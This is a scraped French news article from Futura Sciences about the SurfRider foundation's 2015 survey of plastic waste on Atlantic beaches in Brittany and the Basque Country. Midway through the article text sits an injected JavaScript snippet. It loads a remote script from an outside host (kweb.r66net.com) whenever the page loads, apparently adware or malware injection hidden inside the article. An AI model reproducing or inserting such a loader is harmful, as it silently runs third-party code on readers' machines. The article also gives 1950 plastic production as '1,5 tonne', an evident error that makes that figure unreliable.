{"title": "Les plages pleines de dechets plastique, les oceans aussi", "newspaper": "Futura Sciences", "author": ["Jean-Luc Goudet"], "date_publi": "2017-07-01", "content": "Pour denoncer la pollution des oceans par les matieres plastique - desormais un sujet d'etudes scientifiques -, la fondation SurfRider a parcouru durant un an une serie de plages bordant l'Atlantique, de la Bretagne a l'Espagne. Le decompte rigoureux des dechets montre que le plastique y represente 30 a 97 % des dechets. Les megots et les cotons-tiges ont la vedette. Article publie le 13 avril 2016 Quatre fois durant l'annee 2015, une armee de benevoles a scrupuleusement comptabilise les  dechets  sur cinq zones du littoral atlantique, une en Bretagne et quatre au Pays basque, francais et espagnol, repertoriant leur nature et leurs dimensions. Organisee par la  fondation SurfRider  (et aidee par l'entreprise Suez), mobilisee pour la protection des oceans, l'operation a ete conduite selon un  protocole  defini par la convention des mers regionales  Ospar  (pour Oslo-Paris) et detaillant une methode de suivi d'un meme site sur une annee. Le resultat n'est guere surprenant : les cinq zones sont parsemees de dechets de toutes sortes, en majorite en  matiere plastique , l'exception venant des megots, des cordages et d'objets en verre. Une pollution meconnue vient faire parler d'elle : les batons de cotons-tiges, qui parviennent dans l'ocean quand ils sont jetes dans les toilettes et pas dans une poubelle. La collecte 2015 des benevoles de l'association SurfRider sur la facade atlantique et quelques chiffres mondiaux sur l'ampleur de cette pollution. (c) ide                       Des dechets provenant de l'activite humaine La composition des dechets est variable : sur la plage d'Inpernupe, au Pays basque espagnol, seuls 30 % d'entre eux sont constitues de  plastique  mais cette proportion atteint 94,5 % sur la plage de la Barre, a  Anglet  (Pays basque francais), et 96,6 % sur la plage de Burumendi, en Espagne.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Ce ramassage methodique n'est pas une analyse scientifique et pourrait faire sourire. C'est avant tout une operation mediatique pour illustrer un probleme reel : celui de la  pollution des oceans  par les  dechets plastique . Les dechets presents sur les plages proviennent, pour certains, directement de la main d' Homo sapiens  insouciants. Le rapport prend d'ailleurs en compte les activites humaines, industrielles et touristiques des zones suivies. La recolte sur la plage de Porsmilin, a Locmaria-Plouzane, en Bretagne. (c) SurfRider                               Trop de plastique jete dans l'ocean Les autres sont apportes par la mer et deviennent la face visible de cette  pollution par le plastique , un  materiau  qui ne se degrade que jusqu'a des dimensions micrometriques et est ingere par de nombreux animaux, des plus gros aux plus petits. Comme le rappelle le rapport, une etude parue en 2014 dans la revue  Plos One  estimait la quantite de  plastique repartie dans l'ocean  a pres de 270.000 tonnes, sous forme de 5.000 milliards de morceaux de toutes dimensions. Le rapport souligne aussi que notre appetit pour la matiere plastique augmente exponentiellement, avec une production passee de 1,5 tonne par an en 1950 a 288 millions de tonnes en 2012.  << Une etude menee par  Jambeck et al. , (2015) a demontre qu'en 2010, sur les 275 millions de tonnes de plastique produites, entre 4,8 et 12,7 millions de tonnes auraient fini leur course dans les oceans. >>  Ce sont bien nos habitudes de consommation qui sont a l'origine de cette pollution et il est tout a fait possible de reduire cet apport incongru. Un plastique biodegradable cree a partir de dechets agricoles                       Chaque annee, des tonnes de plastiques sont dispersees dans l'environnement et particulierement dans l'ocean. Une solution proposee par certains laboratoires serait de remplacer ce derive du petrole par un plastique biodegradable et non toxique. Euronews nous en parle en video.                                       ", "theme": "planete"}